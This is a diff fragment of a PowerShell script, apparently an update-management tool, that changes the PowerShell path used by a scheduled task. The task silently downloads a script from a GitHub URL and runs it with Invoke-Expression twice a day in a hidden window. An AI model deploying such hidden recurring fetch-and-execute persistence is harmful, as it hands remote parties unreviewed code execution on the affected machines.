@@ -3,7 +3,7 @@ $PS1URL = "https://raw.githubusercontent.com/RonRunnerElowSum/WindowsUpdate/Prod
 $LaunchString = "Invoke-WebRequest -URI $PS1URL -UseBasicParsing | Invoke-Expression; PunchIt"
 
 function CreateSchedTask () {
-    $Action = New-ScheduledTaskAction -Execute 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -Argument "-WindowStyle Hidden $LaunchString"
+    $Action = New-ScheduledTaskAction -Execute 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe' -Argument "-WindowStyle Hidden $LaunchString"
     $Trigger = @()
     $Trigger += New-ScheduledTaskTrigger -Daily -At 12am
     $Trigger += New-ScheduledTaskTrigger -Daily -At 10am
